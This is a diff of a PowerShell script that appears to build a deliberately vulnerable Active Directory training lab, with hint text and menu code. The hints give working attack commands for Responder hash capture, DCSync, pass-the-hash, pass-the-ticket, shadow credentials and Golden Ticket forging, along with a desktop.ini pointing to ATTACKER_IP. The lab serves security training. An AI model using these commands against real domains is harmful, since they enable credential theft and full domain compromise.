     "C4"  = @("Start Responder: sudo responder -I eth0 -wdF","Wait for any network activity or browse to a non-existent UNC path: \\NONEXISTENT\share","Captured NTLMv2 hashes can be cracked or relayed")
     "C5"  = @("Get-ADUser -Filter * -Properties Description,Info | Select SAMAccountName,Description,Info","Look for patterns like 'pwd:', 'pass:', 'password:' in the output","Which accounts have credentials stored? Can you reuse them?")
     "C6"  = @("The LabTrigger share has a desktop.ini pointing to an attacker UNC path","Update the ATTACKER_IP in the file, then have a domain user browse the share","Capture with Responder, then crack or relay the NTLMv2 hash")
-    "A1"  = @("Check: (Get-ACL 'AD:\\<DomainDN>').Access | Where IdentityReference -match 'helpdesk01'","WriteDACL lets you modify the DACL — add DCSync rights to yourself","PowerView: Add-DomainObjectAcl -TargetIdentity <domain> -Rights DCSync")
+    "A1"  = @("Check: (Get-ACL 'AD:\\[DomainDN]').Access | Where IdentityReference -match 'helpdesk01'","WriteDACL lets you modify the DACL  -  add DCSync rights to yourself","PowerView: Add-DomainObjectAcl -TargetIdentity [domain] -Rights DCSync")
     "A2"  = @("GenericAll = full control over the object","Options: reset password, add SPN for Kerberoasting, add to group","Set-ADAccountPassword -Identity dbadmin -Reset -NewPassword (as helpdesk01)")
     "A3"  = @("GenericWrite lets you modify non-protected attributes","Set a SPN: Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add='fake/spn'}","Then Kerberoast the newly-set SPN")
-    "A4"  = @("ForceChangePassword = User-Force-Change-Password extended right","PowerView: Set-DomainUserPassword -Identity analyst01 -AccountPassword <newpwd>","Or net rpc password analyst01 <newpwd> -U helpdesk01%<pwd> -S <DC>")
+    "A4"  = @("ForceChangePassword = User-Force-Change-Password extended right","PowerView: Set-DomainUserPassword -Identity analyst01 -AccountPassword [newpwd]","Or net rpc password analyst01 [newpwd] -U helpdesk01%[pwd] -S [DC]")
     "A5"  = @("WriteProperty on member = you can add yourself or others to the group","Add-ADGroupMember -Identity IT-Admins -Members analyst01 (run as analyst01)","What privileges does IT-Admins have? Check with PowerView Get-DomainGroupMember")
-    "D1"  = @("Find unconstrained delegation: Get-ADComputer -Filter {TrustedForDelegation -eq `$true}","The DC and all DCs have unconstrained delegation by default — focus on non-DC machines","Abuse: trigger a DC to authenticate to the unconstrained machine, steal TGT with Rubeus")
-    "D2"  = @("Find: Get-ADUser -Filter {TrustedToAuthForDelegation -eq `$true}","Constrained with protocol transition (S4U2Self) = you can impersonate any user","getST.py -spn cifs/<target> -impersonate Administrator -dc-ip <DC> <dom>/svc_sql:<pwd>")
+    "D1"  = @("Find unconstrained delegation: Get-ADComputer -Filter {TrustedForDelegation -eq `$true}","The DC and all DCs have unconstrained delegation by default  -  focus on non-DC machines","Abuse: trigger a DC to authenticate to the unconstrained machine, steal TGT with Rubeus")
+    "D2"  = @("Find: Get-ADUser -Filter {TrustedToAuthForDelegation -eq `$true}","Constrained with protocol transition (S4U2Self) = you can impersonate any user","getST.py -spn cifs/[target] -impersonate Administrator -dc-ip [DC] [dom]/svc_sql:[pwd]")
     "D3"  = @("RBCD prerequisite: write access to msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer","Step 1: Create a machine account (MachineAccountQuota allows this)","Step 2: Set the attribute. Step 3: Request S4U2Self+S4U2Proxy TGS as that machine")
-    "L1"  = @("First dump hashes: secretsdump.py <domain>/Administrator:<pwd>@<DC>","Use the NTLM hash with: psexec.py -hashes :<NTLM> <domain>/Administrator@<target>","Or: wmiexec.py, smbexec.py — all accept -hashes flag")
-    "L2"  = @("Dump NTLM hash from memory: sekurlsa::logonpasswords in Mimikatz","Then: sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:powershell.exe","This spawns a process with that user's identity — run klist to confirm")
-    "L3"  = @("Export tickets: Rubeus dump /service:krbtgt or Mimikatz sekurlsa::tickets /export","Pass ticket: Rubeus ptt /ticket:<base64> then klist to confirm","Or use WinRM/PSSession after importing the TGS for the service")
+    "L1"  = @("First dump hashes: secretsdump.py [domain]/Administrator:[pwd]@[DC]","Use the NTLM hash with: psexec.py -hashes :[NTLM] [domain]/Administrator@[target]","Or: wmiexec.py, smbexec.py  -  all accept -hashes flag")
+    "L2"  = @("Dump NTLM hash from memory: sekurlsa::logonpasswords in Mimikatz","Then: sekurlsa::pth /user:[user] /domain:[dom] /ntlm:[hash] /run:powershell.exe","This spawns a process with that user's identity  -  run klist to confirm")
+    "L3"  = @("Export tickets: Rubeus dump /service:krbtgt or Mimikatz sekurlsa::tickets /export","Pass ticket: Rubeus ptt /ticket:[base64] then klist to confirm","Or use WinRM/PSSession after importing the TGS for the service")
     "P1"  = @("AdminSDHolder propagates ACEs to all protected groups every 60 min (SDProp)","Force it: Invoke-ADSDPropagation (from PowerView/PowerSploit)","After propagation, analyst01 will have GenericAll on Domain Admins, Enterprise Admins, etc.")
-    "P2"  = @("DCSync mimics a replication partner to pull password hashes","secretsdump.py <domain>/analyst01:<pwd>@<DC_IP> -just-dc-ntlm","You get krbtgt hash — what can you do with it?")
-    "P3"  = @("Whisker: Whisker.exe add /target:dbadmin /domain:<DOM> /dc:<DC>","This creates a certificate and sets msDS-KeyCredentialLink","Then: Rubeus asktgt /user:dbadmin /certificate:<cert> /password:<certpwd>")
-    "P4"  = @("Step 1: DCSync to get krbtgt NTLM hash (P2 is deployed as prereq)","Golden Ticket: ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <DOM> Administrator","The ticket works even if the real Administrator password changes — that's the power")
+    "P2"  = @("DCSync mimics a replication partner to pull password hashes","secretsdump.py [domain]/analyst01:[pwd]@[DC_IP] -just-dc-ntlm","You get krbtgt hash  -  what can you do with it?")
+    "P3"  = @("Whisker: Whisker.exe add /target:dbadmin /domain:[DOM] /dc:[DC]","This creates a certificate and sets msDS-KeyCredentialLink","Then: Rubeus asktgt /user:dbadmin /certificate:[cert] /password:[certpwd]")
+    "P4"  = @("Step 1: DCSync to get krbtgt NTLM hash (P2 is deployed as prereq)","Golden Ticket: ticketer.py -nthash [krbtgt_hash] -domain-sid [SID] -domain [DOM] Administrator","The ticket works even if the real Administrator password changes  -  that's the power")
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1452,7 +1452,7 @@ function Show-LabSubMenu {
     )
     while ($true) {
         Write-Banner
-        Write-SectionHeader "Labs  —  $Category"
+        Write-SectionHeader "Labs   -   $Category"
 
         $i = 1
         foreach ($lab in $Labs) {
@@ -1461,7 +1461,7 @@ function Show-LabSubMenu {
             Write-Color "    [" DarkGray -NoNewline
             Write-Color "$i" Yellow -NoNewline
             Write-Color "] " DarkGray -NoNewline
-            Write-Color "$($lab.Id) — $($lab.Name)" $col -NoNewline
+            Write-Color "$($lab.Id)  -  $($lab.Name)" $col -NoNewline
             if ($active) { Write-Color "  $active" Green }
             else { Write-Host "" }
             $i++
@@ -1484,7 +1484,7 @@ function Show-LabActionMenu {
     param([hashtable]$Lab)
     while ($true) {
         Write-Banner
-        Write-SectionHeader "$($Lab.Id) — $($Lab.Name)"
+        Write-SectionHeader "$($Lab.Id)  -  $($Lab.Name)"
         Write-Color "  $($Lab.Desc)" DarkGray
         Write-Host ""
         $isActive = $Global:ADPState.ActiveLabs -contains $Lab.Id
@@ -1516,7 +1516,7 @@ function Show-LabActionMenu {
             }
             "3" {
                 $hints = $Global:LabHints[$Lab.Id]
-                if ($hints) { Show-LabHints -LabName "$($Lab.Id) — $($Lab.Name)" -Hints $hints }
+                if ($hints) { Show-LabHints -LabName "$($Lab.Id)  -  $($Lab.Name)" -Hints $hints }
                 else { Write-Status "No hints available for this lab." WARN; Pause-Menu }
             }
             { $_ -in "B","b" } { return }
@@ -1548,14 +1548,14 @@ $Global:LabCatalog = @{
     ACL = @(
         @{Id="A1"; Name="WriteDACL on Domain Object"; Desc="Grants a low-priv user WriteDACL on the domain root."}
         @{Id="A2"; Name="GenericAll on User"; Desc="Full control over a target user account."}
-        @{Id="A3"; Name="GenericWrite on User"; Desc="Modify non-protected attributes — SPN Kerberoasting path."}
+        @{Id="A3"; Name="GenericWrite on User"; Desc="Modify non-protected attributes  -  SPN Kerberoasting path."}
         @{Id="A4"; Name="ForceChangePassword"; Desc="Extended right to reset passwords on multiple accounts."}
         @{Id="A5"; Name="AddMember to Privileged Group"; Desc="WriteProperty on IT-Admins member attribute."}
     )
     Delegation = @(
         @{Id="D1"; Name="Unconstrained Delegation"; Desc="Enables unconstrained delegation on a computer and service account."}
         @{Id="D2"; Name="Constrained Delegation (S4U)"; Desc="Protocol transition delegation to CIFS on the DC."}
-        @{Id="D3"; Name="RBCD — Resource-Based Constrained Delegation"; Desc="GenericWrite on computer object enabling RBCD abuse."}
+        @{Id="D3"; Name="RBCD  -  Resource-Based Constrained Delegation"; Desc="GenericWrite on computer object enabling RBCD abuse."}
     )
     Lateral = @(
         @{Id="L1"; Name="Pass-the-Hash"; Desc="Creates local admin with known hash; disables PTH mitigations."}
